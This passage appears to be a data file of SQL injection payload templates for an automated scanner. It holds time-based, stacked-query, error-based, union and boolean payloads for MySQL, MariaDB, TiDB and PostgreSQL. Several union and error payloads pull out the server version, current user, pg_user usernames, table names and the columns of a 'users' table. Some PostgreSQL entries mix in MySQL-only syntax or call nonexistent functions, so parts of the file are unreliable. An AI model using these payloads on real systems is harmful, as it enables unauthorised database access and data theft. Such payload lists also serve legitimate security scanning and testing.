  { id: 'mysql-time-104', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: [")"], template: "{ORIG}) AND SLEEP({SLEEP})-- -", where: 'value' },
  { id: 'mysql-time-105', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT SLEEP({SLEEP}))-- -", where: 'value' },
  { id: 'mysql-time-106', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND SLEEP({SLEEP})#", where: 'value' },
  { id: 'mysql-time-107', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND SLEEP({SLEEP})/**/", where: 'value' },
  { id: 'mysql-time-108', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["orderby"], boundary: [""], template: "{ORIG},1=(SELECT SLEEP({SLEEP}))-- -", where: 'position' },
  { id: 'mysql-time-109', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["orderby"], boundary: [""], template: "{ORIG},(SELECT SLEEP({SLEEP}))-- -", where: 'position' },
  { id: 'mysql-time-110', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND IF(1=1,SLEEP({SLEEP}),0)-- -", where: 'value' },
  { id: 'mysql-time-111', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND IF(1=2,SLEEP({SLEEP}),0)-- -", where: 'value' },
  { id: 'mysql-time-112', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND IF(1=1,SLEEP({SLEEP}),0)-- -", where: 'value' },
  { id: 'mysql-time-113', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND IF(1=1,SLEEP({SLEEP}),0)-- -", where: 'value' },
  { id: 'mysql-time-114', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND IF(1=1,SLEEP({SLEEP}),0)-- -", where: 'value' },
  { id: 'mysql-time-115', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND IF(1=1,SLEEP({SLEEP}),0)-- -", where: 'value' },
  { id: 'mysql-time-116', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 5, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND IF(SLEEP({SLEEP}),1,0)-- -", where: 'value' },
  { id: 'mysql-time-117', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND SLEEP({SLEEP}) IS NOT NULL-- -", where: 'value' },
  { id: 'mysql-time-118', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT SLEEP({SLEEP}) FROM DUAL)-- -", where: 'value' },
  { id: 'mysql-time-119', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT IF(1=1,SLEEP({SLEEP}),0))-- -", where: 'value' },
  { id: 'mysql-time-120', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 1, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND ELT(1,SLEEP({SLEEP})) IS NOT NULL-- -", where: 'value' },
  { id: 'mysql-time-121', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(1))-- -", where: 'value' },
  { id: 'mysql-time-122', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(version()))-- -", where: 'value' },
  { id: 'mysql-time-123', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 2, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND BENCHMARK({SLEEP}0000000,SHA1(1))-- -", where: 'value' },
  { id: 'mysql-time-124', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(1))#", where: 'value' },
  { id: 'mysql-time-125', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(1))/**/", where: 'value' },
  { id: 'mysql-time-126', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND IF(1=1,SLEEP({SLEEP}),0)#", where: 'value' },
  { id: 'mysql-time-127', dbms: ["MySQL","MariaDB","TiDB"], technique: 'time', level: 3, risk: 2, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND IF(1=1,SLEEP({SLEEP}),0)/**/", where: 'value' },
  { id: 'mysql-stacked-100', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
  { id: 'mysql-stacked-101', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["\";"], template: "{ORIG}\"; SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
  { id: 'mysql-stacked-102', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
  { id: 'mysql-stacked-103', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["')"], template: "{ORIG}') ; SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
  { id: 'mysql-stacked-104', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}';SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
  { id: 'mysql-stacked-105', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT SLEEP({SLEEP})#", where: 'value' },
  { id: 'mysql-stacked-106', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT SLEEP({SLEEP})/**/", where: 'value' },
  { id: 'mysql-stacked-107', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT IF(1=1,SLEEP({SLEEP}),0) {SEP}", where: 'value' },
  { id: 'mysql-stacked-108', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: [");"], template: "{ORIG}); SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
  { id: 'mysql-stacked-109', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 3, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SET @sqli_probe=1; SELECT SLEEP({SLEEP}) {SEP}", where: 'value' },
  { id: 'mysql-stacked-110', dbms: ["MySQL","MariaDB","TiDB"], technique: 'stacked', level: 4, risk: 2, clause: ["where"], boundary: ["';"], template: "{ORIG}'; SELECT * FROM information_schema.GLOBAL_VARIABLES WHERE VARIABLE_NAME='version'-- -", where: 'value' },
  { id: 'mysql-error-orderby-159', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(extractvalue(1,concat(0x7e,(SELECT version()))))-- -", where: 'position' },
  { id: 'mysql-error-orderby-160', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},(updatexml(1,concat(0x7e,(SELECT database())),1))-- -", where: 'position' },
  { id: 'mysql-bool-groupby-139', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 2, risk: 1, clause: ["groupby"], boundary: ["'"], template: "{ORIG}' HAVING '1'='1'-- -", falseTemplate: "{ORIG}' HAVING '1'='2'-- -", where: 'value' },
  { id: 'mysql-bool-having-140', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["having"], boundary: ["","'",")","\")"], template: "{ORIG} AND 1=1-- -", falseTemplate: "{ORIG} AND 1=2-- -", where: 'value' },
  { id: 'mysql-error-limit-161', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 3, risk: 1, clause: ["limit"], boundary: [""], template: "{ORIG} PROCEDURE ANALYSE(1,1)-- -", where: 'position' },
  { id: 'mysql-error-limit-162', dbms: ["MySQL","MariaDB","TiDB"], technique: 'error', level: 1, risk: 1, clause: ["limit"], boundary: [""], template: "{ORIG} PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)-- -", where: 'position' },
  { id: 'mysql-bool-where-141', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND 1=1-- -", falseTemplate: "{ORIG}') AND 1=2-- -", where: 'value' },
  { id: 'mysql-bool-where-142', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND '1'='1'-- -", falseTemplate: "{ORIG}')) AND '1'='2'-- -", where: 'value' },
  { id: 'mysql-bool-where-143', dbms: ["MySQL","MariaDB","TiDB"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND 1=1-- -", falseTemplate: "{ORIG}\") AND 1=2-- -", where: 'value' },
  // ---- PostgreSQL ----
  { id: 'pg-union-100', dbms: ["PostgreSQL"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},version(),current_user-- -", where: 'value' },
  { id: 'pg-union-101', dbms: ["PostgreSQL"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION SELECT {NUM},version(),current_user-- -", where: 'value' },
  { id: 'pg-union-102', dbms: ["PostgreSQL"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: [")"], template: "{ORIG}) UNION SELECT {NUM},version(),current_user-- -", where: 'value' },
  { id: 'pg-union-103', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},version(),current_user-- -", where: 'value' },
  { id: 'pg-union-104', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION ALL SELECT {NUM},version(),current_user-- -", where: 'value' },
  { id: 'pg-union-105', dbms: ["PostgreSQL"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},current_database(),version()-- -", where: 'value' },
  { id: 'pg-union-106', dbms: ["PostgreSQL"], technique: 'union', level: 5, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT datname FROM pg_database WHERE datistemplate=false LIMIT 1),1-- -", where: 'position' },
  { id: 'pg-union-107', dbms: ["PostgreSQL"], technique: 'union', level: 3, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1-- -", where: 'position' },
  { id: 'pg-union-108', dbms: ["PostgreSQL"], technique: 'union', level: 3, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1-- -", where: 'position' },
  { id: 'pg-union-109', dbms: ["PostgreSQL"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION SELECT {NUM},version(),current_user-- -", where: 'value' },
  { id: 'pg-union-110', dbms: ["PostgreSQL"], technique: 'union', level: 1, risk: 1, clause: ["where"], boundary: ["\"))"], template: "{ORIG}\")) UNION SELECT {NUM},version(),current_user-- -", where: 'value' },
  { id: 'pg-union-111', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION ALL SELECT {NUM},current_database(),version()-- -", where: 'value' },
  { id: 'pg-union-112', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) UNION ALL SELECT {NUM},current_user,version()-- -", where: 'value' },
  { id: 'pg-union-113', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},inet_server_addr()::text,inet_server_port()-- -", where: 'value' },
  { id: 'pg-union-114', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},current_user,inet_server_port()-- -", where: 'value' },
  { id: 'pg-union-115', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},current_schema,current_user-- -", where: 'value' },
  { id: 'pg-union-116', dbms: ["PostgreSQL"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'),1-- -", where: 'value' },
  { id: 'pg-union-117', dbms: ["PostgreSQL"], technique: 'union', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'),1-- -", where: 'value' },
  { id: 'pg-union-118', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION ALL SELECT {NUM},session_user,version()-- -", where: 'value' },
  { id: 'pg-union-119', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION ALL SELECT {NUM},current_user,current_database()-- -", where: 'value' },
  { id: 'pg-union-120', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" UNION ALL SELECT {NUM},version(),current_schema-- -", where: 'value' },
  { id: 'pg-union-121', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') UNION ALL SELECT {NUM},version(),current_database()-- -", where: 'value' },
  { id: 'pg-union-122', dbms: ["PostgreSQL"], technique: 'union', level: 4, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},(SELECT usename FROM pg_user ORDER BY 1 LIMIT 1),1-- -", where: 'position' },
  { id: 'pg-union-123', dbms: ["PostgreSQL"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' UNION SELECT {NUM},current_setting('server_version'),current_user-- -", where: 'value' },
  { id: 'pg-union-124', dbms: ["PostgreSQL"], technique: 'union', level: 4, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} UNION SELECT {NUM},version(),(SELECT count(*) FROM pg_stat_activity)-- -", where: 'value' },
  { id: 'pg-union-125', dbms: ["PostgreSQL"], technique: 'union', level: 3, risk: 1, clause: ["limit"], boundary: ["\""], template: "{ORIG}\" UNION SELECT {NUM},(SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1-- -", where: 'position' },
  { id: 'pg-union-126', dbms: ["PostgreSQL"], technique: 'union', level: 2, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' UNION ALL SELECT {NUM},(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','pg_catalog') LIMIT 1),1-- -", where: 'position' },
  { id: 'pg-error-100', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND CAST((SELECT version()) AS int)-- -", where: 'value' },
  { id: 'pg-error-101', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["","'",")","\")"], template: "{ORIG} AND CAST((SELECT version()) AS int)-- -", where: 'value' },
  { id: 'pg-error-102', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND CAST((SELECT current_user) AS int)-- -", where: 'value' },
  { id: 'pg-error-103', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT current_database()) AS int)-- -", where: 'value' },
  { id: 'pg-error-104', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["groupby"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT current_database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -", where: 'value' },
  { id: 'pg-error-105', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT current_schema) AS int)-- -", where: 'value' },
  { id: 'pg-error-106', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT usename FROM pg_user WHERE usesysid=10) AS int)-- -", where: 'value' },
  { id: 'pg-error-107', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT datname FROM pg_database) AS int)-- -", where: 'value' },
  { id: 'pg-error-108', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -", where: 'position' },
  { id: 'pg-error-109', dbms: ["PostgreSQL"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version()) AS bigint)-- -", where: 'value' },
  { id: 'pg-error-110', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT current_query) AS int)-- -", where: 'value' },
  { id: 'pg-error-111', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["groupby"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT current_schema),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -", where: 'value' },
  { id: 'pg-error-112', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT current_database()) AS boolean)-- -", where: 'value' },
  { id: 'pg-error-113', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT version()) AS date)-- -", where: 'value' },
  { id: 'pg-error-114', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT current_user)::int-- -", where: 'value' },
  { id: 'pg-error-115', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT version())::int-- -", where: 'value' },
  { id: 'pg-error-116', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT usename FROM pg_user LIMIT 1) AS boolean)-- -", where: 'position' },
  { id: 'pg-error-117', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT datname FROM pg_database WHERE datname=current_database()) AS int)-- -", where: 'value' },
  { id: 'pg-error-118', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND CAST((SELECT current_user) AS boolean)-- -", where: 'value' },
  { id: 'pg-error-119', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT CAST((SELECT version()) AS numeric))>0-- -", where: 'value' },
  { id: 'pg-error-120', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT current_setting('server_version')) AS int)-- -", where: 'value' },
  { id: 'pg-error-121', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT version()) AS int)/**/", where: 'value' },
  { id: 'pg-error-122', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version()) AS date)-- -", where: 'value' },
  { id: 'pg-error-123', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version()) AS boolean)-- -", where: 'value' },
  { id: 'pg-error-124', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version()) AS integer)-- -", where: 'value' },
  { id: 'pg-error-125', dbms: ["PostgreSQL"], technique: 'error', level: 4, risk: 1, clause: ["orderby"], boundary: [""], template: "{ORIG},1=(SELECT 1/0)-- -", where: 'position' },
  { id: 'pg-error-126', dbms: ["PostgreSQL"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} FETCH FIRST 1 ROWS ONLY; SELECT 1/0-- -", where: 'value' },
  { id: 'pg-error-127', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["having"], boundary: ["","'",")","\")"], template: "{ORIG} HAVING 1=1 AND 1=CAST((SELECT version()) AS integer)-- -", where: 'value' },
  { id: 'pg-error-128', dbms: ["PostgreSQL"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: [""], template: "{ORIG} OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY; SELECT 1/0-- -", where: 'value' },
  { id: 'pg-error-129', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1::regclass-- -", where: 'value' },
  { id: 'pg-error-130', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND CAST('a' AS integer)-- -", where: 'value' },
  { id: 'pg-error-131', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version()) AS numeric)-- -", where: 'value' },
  { id: 'pg-error-132', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version()) AS numeric)/**/", where: 'value' },
  { id: 'pg-error-133', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'))"], template: "{ORIG}')) AND CAST((SELECT version()) AS int)-- -", where: 'value' },
  { id: 'pg-error-134', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\"))"], template: "{ORIG}\")) AND CAST((SELECT version()) AS int)-- -", where: 'value' },
  { id: 'pg-error-135', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["')"], template: "{ORIG}') AND CAST((SELECT version()) AS int)-- -", where: 'value' },
  { id: 'pg-error-136', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\")"], template: "{ORIG}\") AND CAST((SELECT version()) AS int)-- -", where: 'value' },
  { id: 'pg-error-137', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT current_database())::int-- -", where: 'value' },
  { id: 'pg-error-138', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT usename FROM pg_user LIMIT 1)::int-- -", where: 'position' },
  { id: 'pg-error-139', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["limit"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT datname FROM pg_database LIMIT 1)::int-- -", where: 'position' },
  { id: 'pg-error-140', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT current_database()) AS numeric)-- -", where: 'value' },
  { id: 'pg-error-141', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT current_user) AS numeric)-- -", where: 'value' },
  { id: 'pg-error-142', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT current_database()) AS date)-- -", where: 'value' },
  { id: 'pg-error-143', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND CAST((SELECT current_user) AS date)-- -", where: 'value' },
  { id: 'pg-error-144', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version()) AS json)-- -", where: 'value' },
  { id: 'pg-error-145', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version()) AS xml)-- -", where: 'value' },
  { id: 'pg-error-146', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1 UNION SELECT 2)=1-- -", where: 'value' },
  { id: 'pg-error-147', dbms: ["PostgreSQL"], technique: 'error', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND (SELECT 1 UNION SELECT 2)=1-- -", where: 'value' },
  { id: 'pg-error-148', dbms: ["PostgreSQL"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT 1/0)-- -", where: 'value' },
  { id: 'pg-error-149', dbms: ["PostgreSQL"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND (SELECT 1/0)=1-- -", where: 'value' },
  { id: 'pg-error-150', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT current_setting('server_version')) AS numeric)-- -", where: 'value' },
  { id: 'pg-error-151', dbms: ["PostgreSQL"], technique: 'error', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1::regclass/**/", where: 'value' },
  { id: 'pg-error-152', dbms: ["PostgreSQL"], technique: 'error', level: 3, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND CAST('a' AS integer)/**/", where: 'value' },
  { id: 'pg-error-153', dbms: ["PostgreSQL"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=CAST((SELECT version())::text AS regclass)-- -", where: 'value' },
  { id: 'pg-error-154', dbms: ["PostgreSQL"], technique: 'error', level: 5, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT 1/(CASE WHEN (SELECT version()) IS NOT NULL THEN 1 ELSE 0 END))-- -", where: 'value' },
  { id: 'pg-error-155', dbms: ["PostgreSQL"], technique: 'error', level: 4, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND 1=(SELECT xmltable.encode('text'))-- -", where: 'value' },
  { id: 'pg-boolean-100', dbms: ["PostgreSQL"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' AND '1'='2", where: 'value' },
  { id: 'pg-boolean-101', dbms: ["PostgreSQL"], technique: 'boolean', level: 1, risk: 1, clause: ["where"], boundary: ["\""], template: "{ORIG}\" AND \"1\"=\"2", where: 'value' },
  { id: 'pg-boolean-102', dbms: ["PostgreSQL"], technique: 'boolean', level: 2, risk: 1, clause: ["where"], boundary: ["'"], template: "{ORIG}' OR '1'='2", where: 'value' },
